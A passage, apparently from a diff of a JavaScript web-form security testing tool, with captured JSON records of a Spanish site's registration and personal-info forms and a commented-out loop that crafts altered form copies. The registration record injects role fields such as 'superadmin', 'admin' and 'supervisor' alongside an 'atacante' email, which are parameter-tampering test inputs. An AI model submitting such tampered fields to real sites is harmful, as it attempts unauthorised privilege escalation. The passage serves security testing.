\u003ca href=\"conditions.html\" target=\"_blank\"\u003econdiciones de uso\u003c/a\u003e y la \u003ca href=\"privacy.html\" target=\"_blank\"\u003epolítica de privacidad\u003c/a\u003e.\n            \u003c/label\u003e\n        \u003c/div\u003e\n        \u003cdiv class=\"checkbox-list\"\u003e\n            \u003clabel class=\"checkbox\" style=\"font-size: 13px;\"\u003e\n                \u003cinput type=\"checkbox\" name=\"communicationsAllowed\" id=\"communicationsAllowed\" value=\"true\" title=\"Deseo recibir comunicaciones de Marketing y Promociones vía email.\"\u003e\n                Deseo recibir comunicaciones de Marketing y Promociones vía email.\n            \u003c/label\u003e\n        \u003c/div\u003e\n        \u003cinput class=\"btn green\" type=\"submit\" name=\"register\" id=\"register\" value=\"Registrarme\"\u003e\n    \n\u003c/form\u003e","enctype":"application/x-www-form-urlencoded","inputs":[{"Type":"radio","name":"test3.0","value":"regularuser","checked":true,"defaultvalue":"","modified":false},{"Type":"radio","name":"test3.0","value":"superadmin","checked":false,"defaultvalue":"","modified":false},{"Type":"radio","name":"test3.1","value":"blue","checked":true,"defaultvalue":"","modified":false},{"Type":"radio","name":"test3.1","value":"white","checked":false,"defaultvalue":"","modified":false},{"Type":"checkbox","name":"supervisor","value":"","checked":false,"defaultvalue":"","modified":false},{"Type":"checkbox","name":"regularuser","value":"","checked":true,"defaultvalue":"","modified":false},{"Type":"select-one","name":"rol","value":"[{\"value\":\"regular\",\"text\":\"RegularUser\",\"selected\":true},{\"value\":\"admin\",\"text\":\"Admin\",\"selected\":false}]","defaultValue":""},{"Type":"hidden","name":"authenticityToken","value":"677b5d86402f7a1cfd3b956cccbf601cd830dff3","defaultvalue":"","modified":false},{"Type":"text","name":"name","value":"","defaultvalue":"","modified":false},{"Type":"text","name":"email","value":"paco@atacante.com","defaultvalue":"","modified":false},{"Type":"password","name":"password","value":"12","defaultvalue":"","modified":true},{"Type":"password","name":"passwordCheck","value":"","defaultvalue":"","modified":false},{"Type":"checkbox","name":"terms","value":"on","defaultvalue":"","modified":false},{"Type":"checkbox","name":"communicationsAllowed","value":"true","defaultvalue":"","modified":false},{"Type":"submit","name":"register","value":"Registrarme","defaultvalue":"","modified":false}],"originalInputs":[{"Type":"hidden","name":"authenticityToken","value":"677b5d86402f7a1cfd3b956cccbf601cd830dff3","defaultvalue":"","modified":false},{"Type":"text","name":"name","value":"","defaultvalue":"","modified":false},{"Type":"text","name":"email","value":"","defaultvalue":"","modified":false},{"Type":"password","name":"password","value":"","defaultvalue":"","modified":false},{"Type":"password","name":"passwordCheck","value":"","defaultvalue":"","modified":false},{"Type":"checkbox","name":"terms","value":"on","defaultvalue":"","modified":false},{"Type":"checkbox","name":"communicationsAllowed","value":"true","defaultvalue":"","modified":false},{"Type":"submit","name":"register","value":"Registrarme","defaultvalue":"","modified":false}],"queryForm":"authenticityToken=677b5d86402f7a1cfd3b956cccbf601cd830dff3\u0026name=\u0026email=\u0026password=\u0026passwordCheck=\u0026","identifier":"-366070925","base64link":"data:text/html;base64,PGNlbnRlcj48Zm9ybSBhY3Rpb249Ii93d3cvcmVnaXN0ZXIiIG1ldGhvZD0icG9zdCIgYWNjZXB0LWNoYXJzZXQ9InV0Zi04IiBlbmN0eXBlPSJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiIGlkPSJyZWdpc3RlckZvcm0iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhdXRoZW50aWNpdHlUb2tlbiIgdmFsdWU9IjY3N2I1ZDg2NDAyZjdhMWNmZDNiOTU2Y2NjYmY2MDFjZDgzMGRmZjMiPgogICAgICAgIDxoMj4xIENyZWEgdHUgY3VlbnRhIExhdGNoPC9oMj4KCiAgICAgICAgPHA+UmVnw61zdHJhdGUgJm5ic3A7Y29uIHR1IGVtYWlsIHkgY29uZmlybWEgdHUgY3VlbnRhIGRlIHVzdWFyaW8uIFVuYSB2ZXogcXVlIGluaWNpZXMgc2VzacOzbiwgcHVlZGVzIGVtcGV6YXIgYSA8ZW0+cGFyZWFyPC9lbT4gc2VydmljaW9zIHkgYmxvcXVlYXJsb3MgbyBkZXNibG9xdWVhcmxvcy48L3A+CgogICAgICAgIDxwIGNsYXNzPSJtYXJnaW4tYm90dG9tLTIwIj48L3A+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCBtYXJnaW4tYm90dG9tLTIwIj4KICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImlucHV0LWdyb3VwLWFkZG9uIj48aSBjbGFzcz0iZmEgZmEtdXNlciI+PC9pPjwvc3Bhbj4KICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHBsYWNlaG9sZGVyPSJOb21icmUiIG5hbWU9Im5hbWUiIGlkPSJuYW1lIiB2YWx1ZT0iIj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCBtYXJnaW4tYm90dG9tLTIwIj4KICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImlucHV0LWdyb3VwLWFkZG9uIj48aSBjbGFzcz0iZmEgZmEtZW52ZWxvcGUiPjwvaT48L3NwYW4+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iQ29ycmVvIGVsZWN0csOzbmljbyIgbmFtZT0iZW1haWwiIGlkPSJlbWFpbCIgdmFsdWU9IiI+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAgbWFyZ2luLWJvdHRvbS0yMCI+CiAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC1hZGRvbiI+PGkgY2xhc3M9ImZhIGZhLWxvY2siPjwvaT48L3NwYW4+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgY2xhc3M9ImZvcm0tY29udHJvbCIgcGxhY2Vob2xkZXI9Ik51ZXZhIGNvbnRyYXNlw7FhIChtw61uLiA2IGNhcmFjdGVyZXMpIiBuYW1lPSJwYXNzd29yZCIgaWQ9InBhc3N3b3JkIiBhdXRvY29tcGxldGU9Im9mZiI+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAgbWFyZ2luLWJvdHRvbS0yMCI+CiAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC1hZGRvbiI+PGkgY2xhc3M9ImZhIGZhLWxvY2siPjwvaT48L3NwYW4+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgY2xhc3M9ImZvcm0tY29udHJvbCIgcGxhY2Vob2xkZXI9IkNvbmZpcm1hciBudWV2YSBjb250cmFzZcOxYSIgbmFtZT0icGFzc3dvcmRDaGVjayIgaWQ9InBhc3N3b3JkQ2hlY2siIGF1dG9jb21wbGV0ZT0ib2ZmIj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJjaGVja2JveC1saXN0Ij4KICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJjaGVja2JveCIgc3R5bGU9ImZvbnQtc2l6ZTogMTNweDsiPiA8aW5wdXQgdHlwZT0iY2hlY2tib3giIGlkPSJ0ZXJtcyIgbmFtZT0idGVybXMiIHRpdGxlPSJEZWJlcyBhY2VwdGFyIGxhcyBjb25kaWNpb25lcyBkZSB1c28gbWFyY2FuZG8gZWwgY3VhZHJvIj4KICAgICAgICAgICAgQ29uZmlybW8gcXVlIGhlIGxlw61kbyB5IHF1ZSBhY2VwdG8gbGFzIDxhIGhyZWY9ImNvbmRpdGlvbnMuaHRtbCIgdGFyZ2V0PSJfYmxhbmsiPmNvbmRpY2lvbmVzIGRlIHVzbzwvYT4geSBsYSA8YSBocmVmPSJwcml2YWN5Lmh0bWwiIHRhcmdldD0iX2JsYW5rIj5wb2zDrXRpY2EgZGUgcHJpdmFjaWRhZDwvYT4uCiAgICAgICAgICAgIDwvbGFiZWw+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY2hlY2tib3gtbGlzdCI+CiAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iY2hlY2tib3giIHN0eWxlPSJmb250LXNpemU6IDEzcHg7Ij4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iY29tbXVuaWNhdGlvbnNBbGxvd2VkIiBpZD0iY29tbXVuaWNhdGlvbnNBbGxvd2VkIiB2YWx1ZT0idHJ1ZSIgdGl0bGU9IkRlc2VvIHJlY2liaXIgY29tdW5pY2FjaW9uZXMgZGUgTWFya2V0aW5nIHkgUHJvbW9jaW9uZXMgdsOtYSBlbWFpbC4iPgogICAgICAgICAgICAgICAgRGVzZW8gcmVjaWJpciBjb211bmljYWNpb25lcyBkZSBNYXJrZXRpbmcgeSBQcm9tb2Npb25lcyB2w61hIGVtYWlsLgogICAgICAgICAgICA8L2xhYmVsPgogICAgICAgIDwvZGl2PgogICAgICAgIDxpbnB1dCBjbGFzcz0iYnRuIGdyZWVuIiB0eXBlPSJzdWJtaXQiIG5hbWU9InJlZ2lzdGVyIiBpZD0icmVnaXN0ZXIiIHZhbHVlPSJSZWdpc3RyYXJtZSI+CiAgICAKPC9mb3JtPjwvY2VudGVyPg==","inject":false,"used":true,"HttpStatusCode":""}]
+    payloads=JSON.stringify(data);
+    payloads = JSON.parse(payloads)   
+    Attempts=[]
+
+    var v1={};
+    Object.assign(v1, payloads[0]);
+
+    var v2={};
+    Object.assign(v2, payloads[0]);
+
+    var TwoPayloads = [v1, v2];
+
+    for(payload of payloads){
+        
+        // standalone version
+        if(settings){
+            // original values + overwritten values with settings (Standalone)
+            
+
+
+            
+            TwoPayloads[0].inputs = craftNewForms(payload.inputs, false)
+            //-----------------------------
+            TwoPayloads[1].inputs = craftNewForms(payload.inputs, true)
+            
+        }
+        //else{
+            // original values + overwritten values with settings (Dashboard)
+            //payloads[i]
+            //Attempts.push()
+        //}
+
+
+    }
+    */
+
+    // -----------------------------------------------------------------------------------------
+    
+    data = [{"_id": {"$oid": "601ed941bb52b397bd70c8eb"}, "origin": "https://aaaaaaaaaaa.com/www/personalinfo.html", "action": "https://aaaaaaaaaaa.com/www/updatePersonalInfo", "method": "post", "outerHTML": "<form action=\"/www/updatePersonalInfo\" method=\"post\" accept-charset=\"utf-8\" enctype=\"application/x-www-form-urlencoded\" class=\"form-horizontal\" role=\"form\">\n<input type=\"hidden\" name=\"authenticityToken\" value=\"142181d316d0e21f9b7c9516e2af197d47542d60\">\n    <div class=\"input-group margin-bottom-20\"><span class=\"input-group-addon\"><i class=\"icon-user\"></i></span>\n        <input type=\"text\" class=\"form-control\" placeholder=\"Nombre *\" name=\"name\" id=\"name\" value=\"Paco\">\n    </div>\n    <div class=\"input-group margin-bottom-20\"><span class=\"input-group-addon\"><i class=\"icon-envelope\"></i></span>\n        <input type=\"text\" class=\"form-control\" placeholder=\"Email de notificaci\u00f3n *\" name=\"notificationEmail\" id=\"notificationEmail\" value=\"zdmgserhirlffhvyya@awdrt.org\">\n    </div>\n\n    <div class=\"input-group margin-bottom-20\"><span class=\"input-group-addon\"><i class=\"icon-home\"></i></span>\n        <input type=\"text\" class=\"form-control\" placeholder=\"Direcci\u00f3n\" name=\"address\" id=\"address\" value=\"\">\n    </div>\n    <div class=\"input-group margin-bottom-20\">\n        <span class=\"input-group-addon\"><i class=\"icon-globe\"></i></span>\n                    <div class=\"select2-container 'bfh-selectbox js-select2 bfh-countries form-control\" id=\"s2id_country\"><a href=\"javascript:void(0)\" class=\"select2-choice\" tabindex=\"-1\">   <span class=\"select2-chosen\" id=\"select2-chosen-1\">Argelia</span><abbr class=\"select2-search-choice-close\"></abbr>   <span class=\"select2-arrow\" role=\"presentation\"><b role=\"presentation\"></b></span></a><label for=\"s2id_autogen1\" class=\"select2-offscreen\"></label><input class=\"select2-focusser select2-offscreen\" type=\"text\" aria-haspopup=\"true\" role=\"button\" aria-labelledby=\"select2-chosen-1\" id=\"s2id_autogen1\"><div class=\"select2-drop select2-display-none select2-with-searchbox\">   <div class=\"select2-search\">       <label for=\"s2id_autogen1_search\" class=\"select2-offscreen\"></label>       <input type=\"text\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\" class=\"select2-input\" role=\"combobox\" aria-expanded=\"true\" aria-autocomplete=\"list\" aria-owns=\"select2-results-1\" id=\"s2id_autogen1_search\" placeholder=\"\">   </div>   <ul class=\"select2-results\" role=\"listbox\" id=\"select2-results-1\">   </ul></div></div><select class=\"'bfh-selectbox js-select2 bfh-countries form-control\" data-country=\"DZ\" name=\"country\" id=\"country\" tabindex=\"-1\" title=\"\" style=\"display: none;\"><option value=\"\"></option><option value=\"EMPTY\">Pa\u00eds</option><option value=\"AF\">Afganist\u00e1n</option><option value=\"AL\">Albania</option><option value=\"DE\">Alemania</option><option value=\"AD\">Andorra</option><option value=\"AO\">Angola</option><option value=\"AI\">Anguila</option><option value=\"AQ\">Ant\u00e1rtida</option><option value=\"AG\">Antigua y Barbuda</option><option value=\"AN\">Antillas Neerlandesas</option><option value=\"SA\">Arabia Saudita</option><option value=\"DZ\">Argelia</option><option value=\"AR\">Argentina</option><option value=\"AM\">Armenia</option><option value=\"AW\">Aruba</option><option value=\"AU\">Australia</option><option value=\"AT\">Austria</option><option value=\"AZ\">Azerbaiy\u00e1n</option><option value=\"BS\">Bahamas</option><option value=\"BD\">Bangladesh</option><option value=\"BB\">Barbados</option><option value=\"BH\">Bahr\u00e9in</option><option value=\"BE\">B\u00e9lgica</option><option value=\"BZ\">Belice</option><option value=\"BJ\">Ben\u00edn</option><option value=\"BM\">Bermudas</option><option value=\"BY\">Bielorrusia</option><option value=\"BO\">Bolivia</option><option value=\"BA\">Bosnia-Herzegovina</option><option value=\"BW\">Botsuana</option><option value=\"BR\">Brasil</option><option value=\"BN\">Brunei</option><option value=\"BG\">Bulgaria</option><option value=\"BF\">Burkina Faso</option><option value=\"BI\">Burundi</option><option value=\"BT\">But\u00e1n</option><option value=\"CV\">Cabo Verde</option><option value=\"KH\">Camboya</option><option value=\"CM\">Camer\u00fan</option><option value=\"CA\">Canad\u00e1</option><option value=\"TD\">Chad</option><option value=\"CL\">Chile</option><option value=\"CN\">China</option><option value=\"CY\">Chipre</option><option value=\"VA\">Ciudad del Vaticano</option><option value=\"CO\">Colombia</option><option value=\"KM\">Comoras</option><option value=\"KP\">Corea del Norte</option><option value=\"KR\">Corea del Sur</option><option value=\"CI\">Costa de Marfil</option><option value=\"CR\">Costa Rica</option><option value=\"HR\">Croacia</option><option value=\"CU\">Cuba</option><option value=\"DK\">Dinamarca</option><option value=\"DM\">Dominica</option><option value=\"EC\">Ecuador</option><option value=\"EG\">Egipto</option><option value=\"SV\">El Salvador</option><option value=\"AE\">Emiratos \u00c1rabes Unidos</option><option value=\"ER\">Eritrea</option><option value=\"SK\">Eslovaquia</option><option value=\"SI\">Eslovenia</option><option value=\"ES\">Espa\u00f1a</option><option value=\"US\">Estados Unidos</option><option value=\"EE\">Estonia</option><option value=\"ET\">Etiop\u00eda</option><option value=\"FJ\">Fiji</option><option value=\"PH\">Filipinas</option><option value=\"FI\">Finlandia</option><option value=\"FX\">Francia Metropolitana</option><option value=\"FR\">Francia</option><option value=\"GA\">Gab\u00f3n</option><option value=\"GM\">Gambia</option><option value=\"GE\">Georgia</option><option value=\"GH\">Ghana</option><option value=\"GI\">Gibraltar</option><option value=\"GD\">Granada</option><option value=\"GR\">Grecia</option><option value=\"GL\">Groenlandia</option><option value=\"GP\">Guadalupe</option><option value=\"GU\">Guam</option><option value=\"GT\">Guatemala</option><option value=\"GF\">Guayana Francesa</option><option value=\"GQ\">Guinea Ecuatorial</option><option value=\"GN\">Guinea</option><option value=\"GW\">Guinea-Bissau</option><option value=\"GY\">Guyana</option><option value=\"HT\">Hait\u00ed</option><option value=\"HN\">Honduras</option><option value=\"HK\">Hong Kong</option><option value=\"HU\">Hungr\u00eda</option><option value=\"IN\">India</option><option value=\"ID\">Indonesia</option><option value=\"IQ\">Irak</option><option value=\"IR\">Ir\u00e1n</option><option value=\"IE\">Irlanda</option><option value=\"BV\">Isla Bouvet</option><option value=\"CX\">Isla de Navidad</option><option value=\"NF\">Isla Norfolk</option><option value=\"IS\">Islandia</option><option value=\"KY\">Islas Caim\u00e1n</option><option value=\"CC\">Islas Cocos</option><option value=\"CK\">Islas Cook</option><option value=\"FO\">Islas Feroe</option><option value=\"GS\">Islas Georgias del Sur y Sandwich del Sur</option><option value=\"HM\">Islas Heard y McDonald</option><option value=\"FK\">Islas Malvinas</option><option value=\"MP\">Islas Marianas del Norte</option><option value=\"MH\">Islas Marshall</option><option value=\"PN\">Islas Pitcairn</option><option value=\"SB\">Islas Salom\u00f3n</option><option value=\"TC\">Islas Turcas y Caicos</option><option value=\"UM\">Islas Ultramarinas Menores de Estados Unidos</option><option value=\"VG\">Islas V\u00edrgenes Brit\u00e1nicas</option><option value=\"VI\">Islas V\u00edrgenes de los Estados Unidos</option><option value=\"IL\">Israel</option><option value=\"IT\">Italia</option><option value=\"JM\">Jamaica</option><option value=\"JP\">Jap\u00f3n</option><option value=\"JO\">Jordania</option><option value=\"KZ\">Kazajist\u00e1n</option><option value=\"KE\">Kenia</option><option value=\"KG\">Kirguist\u00e1n</option><option value=\"KI\">Kiribati</option><option value=\"KW\">Kuwait</option><option value=\"LA\">Laos</option><option value=\"LS\">Lesoto</option><option value=\"LV\">Letonia</option><option value=\"LB\">L\u00edbano</option><option value=\"LR\">Liberia</option><option value=\"LY\">Libia</option><option value=\"LI\">Liechtenstein</option><option value=\"LT\">Lituania</option><option value=\"LU\">Luxemburgo</option><option value=\"MO\">Macao</option><option value=\"MG\">Madagascar</option><option value=\"MY\">Malasia</option><option value=\"MW\">Malawi</option><option value=\"MV\">Maldivas</option><option value=\"ML\">Mal\u00ed</option><option value=\"MT\">Malta</option><option value=\"MA\">Marruecos</option><option value=\"MQ\">Martinica</option><option value=\"MU\">Mauricio</option><option value=\"MR\">Mauritania</option><option value=\"YT\">Mayotte</option><option value=\"MX\">M\u00e9xico</option><option value=\"FM\">Micronesia</option><option value=\"MD\">Moldavia</option><option value=\"MC\">M\u00f3naco</option><option value=\"MN\">Mongolia</option><option value=\"ME\">Montenegro</option><option value=\"MS\">Montserrat</option><option value=\"MZ\">Mozambique</option><option value=\"MM\">Myanmar</option><option value=\"NA\">Namibia</option><option value=\"NR\">Nauru</option><option value=\"NP\">Nepal</option><option value=\"NI\">Nicaragua</option><option value=\"NE\">N\u00edger</option><option value=\"NG\">Nigeria</option><option value=\"NU\">Niue</option><option value=\"NO\">Noruega</option><option value=\"NC\">Nueva Caledonia</option><option value=\"NZ\">Nueva Zelanda</option><option value=\"OM\">Om\u00e1n</option><option value=\"NL\">Pa\u00edses Bajos</option><option value=\"PK\">Pakist\u00e1n</option><option value=\"PW\">Palaos</option><option value=\"PS\">Palestina</option><option value=\"PA\">Panam\u00e1</option><option value=\"PG\">Pap\u00faa Nueva Guinea</option><option value=\"PY\">Paraguay</option><option value=\"PE\">Per\u00fa</option><option value=\"PF\">Polinesia Francesa</option><option value=\"PL\">Polonia</option><option value=\"PT\">Portugal</option><option value=\"PR\">Puerto Rico</option><option value=\"QA\">Qatar</option><option value=\"GB\">Reino Unido</option><option value=\"CF\">Rep\u00fablica Centroafricana</option><option value=\"CZ\">Rep\u00fablica Checa</option><option value=\"MK\">Rep\u00fablica de Macedonia</option><option value=\"CG\">Rep\u00fablica del Congo</option><option value=\"CD\">Rep\u00fablica Democr\u00e1tica del Congo</option><option value=\"DO\">Rep\u00fablica Dominicana</option><option value=\"RE\">Reuni\u00f3n</option><option value=\"RW\">Ruanda</option><option value=\"RO\">Ruman\u00eda</option><option value=\"RU\">Rusia</option><option value=\"EH\">Sahara Occidental</option><option value=\"AS\">Samoa Americana</option><option value=\"WS\">Samoa</option><option value=\"KN\">San Crist\u00f3bal y Nieves</option><option value=\"SM\">San Marino</option><option value=\"PM\">San Pedro y Miquel\u00f3n</option><option value=\"VC\">San Vicente y las Granadinas</option><option value=\"SH\">Santa Helena</option><option value=\"LC\">Santa Luc\u00eda</option><option value=\"ST\">Santo Tom\u00e9 y Pr\u00edncipe</option><option value=\"SN\">Senegal</option><option value=\"RS\">Serbia</option><option value=\"SC\">Seychelles</option><option value=\"SL\">Sierra Leona</option><option value=\"SG\">Singapur</option><option value=\"SY\">Siria</option><option value=\"SO\">Somalia</option><option value=\"LK\">Sri Lanka</option><option value=\"SZ\">Suazilandia</option><option value=\"ZA\">Sud\u00e1frica</option><option value=\"SD\">Sud\u00e1n</option><option value=\"SE\">Suecia</option><option value=\"CH\">Suiza</option><option value=\"SR\">Surinam</option><option value=\"SJ\">Svalbard y Jan Mayen</option><option value=\"TH\">Tailandia</option><option value=\"TW\">Taiw\u00e1n</option><option value=\"TZ\">Tanzania</option><option value=\"TJ\">Tayikist\u00e1n</option><option value=\"IO\">Territorio Brit\u00e1nico del Oc\u00e9ano \u00cdndico</option><option value=\"TF\">Territorios Australes y Ant\u00e1rticos Franceses</option><option value=\"TP\">Timor Oriental</option><option value=\"TG\">Togo</option><option value=\"TK\">Tokelau</option><option value=\"TO\">Tonga</option><option value=\"TT\">Trinidad y Tobago</option><option value=\"TN\">T\u00fanez</option><option value=\"TM\">Turkmenist\u00e1n</option><option value=\"TR\">Turqu\u00eda</option><option value=\"TV\">Tuvalu</option><option value=\"UA\">Ucrania</option><option value=\"UG\">Uganda</option><option value=\"UY\">Uruguay</option><option value=\"UZ\">Uzbekist\u00e1n</option><option value=\"VU\">Vanuatu</option><option value=\"VE\">Venezuela</option><option value=\"VN\">Vietnam</option><option value=\"WF\">Wallis y Futuna</option><option value=\"YE\">Yemen</option><option value=\"DJ\">Yibuti</option><option value=\"ZM\">Zambia</option><option value=\"ZW\">Zimbabue</option></select>\n                    </div>\n    <div class=\"input-group margin-bottom-20\"><span class=\"input-group-addon\">#</span>\n        <input type=\"text\" class=\"form-control\" placeholder=\"NIF\" name=\"nif\" id=\"nif\" value=\"\">\n    </div>\n    <div class=\"input-group margin-bottom-20\"><span class=\"input-group-addon\"><i class=\"icon-briefcase\"></i></span>\n        <input type=\"text\" class=\"form-control\" placeholder=\"Empresa\" name=\"company\" id=\"company\" value=\"\">\n    </div>\n\n    <label for=\"userLang\" class=\"\">Idioma preferido para las comunicaciones</label>\n    <div class=\"input-group margin-bottom-20\">\n        <span class=\"input-group-addon\"><i class=\"icon-comment\"></i></span>\n        <div class=\"select2-container js-select2\" id=\"s2id_userLang\"><a href=\"javascript:void(0)\" class=\"select2-choice\" tabindex=\"-1\">   <span class=\"select2-chosen\" id=\"select2-chosen-2\">Deutsch</span><abbr class=\"select2-search-choice-close\"></abbr>   <span class=\"select2-arrow\" role=\"presentation\"><b role=\"presentation\"></b></span></a><label for=\"s2id_autogen2\" class=\"select2-offscreen\">Idioma preferido para las comunicaciones</label><input class=\"select2-focusser select2-offscreen\" type=\"text\" aria-haspopup=\"true\" role=\"button\" aria-labelledby=\"select2-chosen-2\" id=\"s2id_autogen2\"><div class=\"select2-drop select2-display-none select2-with-searchbox\">   <div class=\"select2-search\">       <label for=\"s2id_autogen2_search\" class=\"select2-offscreen\">Idioma preferido para las comunicaciones</label>       <input type=\"text\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" spellcheck=\"false\" class=\"select2-input\" role=\"combobox\" aria-expanded=\"true\" aria-autocomplete=\"list\" aria-owns=\"select2-results-2\" id=\"s2id_autogen2_search\" placeholder=\"\">   </div>   <ul class=\"select2-results\" role=\"listbox\" id=\"select2-results-2\">   </ul></div></div><select id=\"userLang\" name=\"userLang\" class=\"js-select2\" tabindex=\"-1\" title=\"Idioma preferido para las comunicaciones\" style=\"display: none;\">\n            <option value=\"ES\">Espa\u00f1ol</option>\n            <option value=\"EN\">English</option>\n            <option value=\"PT\">Portugu\u00eas</option>\n            <option value=\"DE\" selected=\"selected\">Deutsch</option>\n        </select>\n    </div>\n\n    <div class=\"input-group margin-bottom-20\">\n        <div class=\"checker\" id=\"uniform-communicationsAllowed\"><span><input type=\"checkbox\" name=\"communicationsAllowed\" id=\"communicationsAllowed\" value=\"true\"></span></div>\n        <span>\n            Deseo recibir comunicaciones de Marketing y Promociones v\u00eda email.\n        </span>\n    </div>\n\n<div>\n    <button type=\"submit\" class=\"submit\">Guardar cambios</button>\n    <a href=\"#removeAccountModal\" data-toggle=\"modal\" class=\"btn btn-danger rounded_button\">Borrar cuenta</a>\n    <div class=\"clearfix\"></div>\n</div>\n    <div class=\"clearfix\"></div>\n\n<div style=\"text-align: center\">\n    <a href=\"/www/developerArea\">Volver al \u00c1rea de Desarrolladores</a>\n</div>\n\n\n</form>", "enctype": "application/x-www-form-urlencoded", "inputs": [{"Type": "hidden", "name": "authenticityToken", "value": "142181d316d0e21f9b7c9516e2af197d47542d60", "modified": false}, {"Type": "text", "name": "name", "value": "Paco", "modified": false}, {"Type": "text", "name": "notificationEmail", "value": "zdmgserhirlffhvyya@awdrt.org", "modified": false}, {"Type": "text", "name": "address", "value": "Casa", "modified": false}, {"Type": "select-one", "name": "country", "value": "[{\"value\":\"\",\"text\":\"\",\"selected\":true},{\"value\":\"EMPTY\",\"text\":\"Pa\u00eds\",\"selected\":false},{\"value\":\"AF\",\"text\":\"Afganist\u00e1n\",\"selected\":false},{\"value\":\"AL\",\"text\":\"Albania\",\"selected\":false},{\"value\":\"DE\",\"text\":\"Alemania\",\"selected\":false},{\"value\":\"AD\",\"text\":\"Andorra\",\"selected\":false},{\"value\":\"AO\",\"text\":\"Angola\",\"selected\":false},{\"value\":\"AI\",\"text\":\"Anguila\",\"selected\":false},{\"value\":\"AQ\",\"text\":\"Ant\u00e1rtida\",\"selected\":false},{\"value\":\"AG\",\"text\":\"Antigua y Barbuda\",\"selected\":false},{\"value\":\"AN\",\"text\":\"Antillas Neerlandesas\",\"selected\":false},{\"value\":\"SA\",\"text\":\"Arabia Saudita\",\"selected\":false},{\"value\":\"DZ\",\"text\":\"Argelia\",\"selected\":false},{\"value\":\"AR\",\"text\":\"Argentina\",\"selected\":false},{\"value\":\"AM\",\"text\":\"Armenia\",\"selected\":false},{\"value\":\"AW\",\"text\":\"Aruba\",\"selected\":false},{\"value\":\"AU\",\"text\":\"Australia\",\"selected\":false},{\"value\":\"AT\",\"text\":\"Austria\",\"selected\":false},{\"value\":\"AZ\",\"text\":\"Azerbaiy\u00e1n\",\"selected\":false},{\"value\":\"BS\",\"text\":\"Bahamas\",\"selected\":false},{\"value\":\"BD\",\"text\":\"Bangladesh\",\"selected\":false},{\"value\":\"BB\",\"text\":\"Barbados\",\"selected\":false},{\"value\":\"BH\",\"text\":\"Bahr\u00e9in\",\"selected\":false},{\"value\":\"BE\",\"text\":\"B\u00e9lgica\",\"selected\":false},{\"value\":\"BZ\",\"text\":\"Belice\",\"selected\":false},{\"value\":\"BJ\",\"text\":\"Ben\u00edn\",\"selected\":false},{\"value\":\"BM\",\"text\":\"Bermudas\",\"selected\":false},{\"value\":\"BY\",\"text\":\"Bielorrusia\",\"selected\":false},{\"value\":\"BO\",\"text\":\"Bolivia\",\"selected\":false},{\"value\":\"BA\",\"text\":\"Bosnia-Herzegovina\",\"selected\":false},{\"value\":\"BW\",\"text\":\"Botsuana\",\"selected\":false},{\"value\":\"BR\",\"text\":\"Brasil\",\"selected\":false},{\"value\":\"BN\",\"text\":\"Brunei\",\"selected\":false},{\"value\":\"BG\",\"text\":\"Bulgaria\",\"selected\":false},{\"value\":\"BF\",\"text\":\"Burkina Faso\",\"selected\":false},{\"value\":\"BI\",\"text\":\"Burundi\",\"selected\":false},{\"value\":\"BT\",\"text\":\"But\u00e1n\",\"selected\":false},{\"value\":\"CV\",\"text\":\"Cabo Verde\",\"selected\":false},{\"value\":\"KH\",\"text\":\"Camboya\",\"selected\":false},{\"value\":\"CM\",\"text\":\"Camer\u00fan\",\"selected\":false},{\"value\":\"CA\",\"text\":\"Canad\u00e1\",\"selected\":false},{\"value\":\"TD\",\"text\":\"Chad\",\"selected\":false},{\"value\":\"CL\",\"text\":\"Chile\",\"selected\":false},{\"value\":\"CN\",\"text\":\"China\",\"selected\":false},{\"value\":\"CY\",\"text\":\"Chipre\",\"selected\":false},{\"value\":\"VA\",\"text\":\"Ciudad del Vaticano\",\"selected\":false},{\"value\":\"CO\",\"text\":\"Colombia\",\"selected\":false},{\"value\":\"KM\",\"text\":\"Comoras\",\"selected\":false},{\"value\":\"KP\",\"text\":\"Corea del Norte\",\"selected\":false},{\"value\":\"KR\",\"text\":\"Corea del Sur\",\"selected\":false},{\"value\":\"CI\",\"text\":\"Costa de Marfil\",\"selected\":false},{\"value\":\"CR\",\"text\":\"Costa Rica\",\"selected\":false},{\"value\":\"HR\",\"text\":\"Croacia\",\"selected\":false},{\"value\":\"CU\",\"text\":\"Cuba\",\"selected\":false},{\"value\":\"DK\",\"text\":\"Dinamarca\",\"selected\":false},{\"value\":\"DM\",\"text\":\"Dominica\",\"selected\":false},{\"value\":\"EC\",\"text\":\"Ecuador\",\"selected\":false},{\"value\":\"EG\",\"text\":\"Egipto\",\"selected\":false},{\"value\":\"SV\",\"text\":\"El Salvador\",\"selected\":false},{\"value\":\"AE\",\"text\":\"Emiratos \u00c1rabes 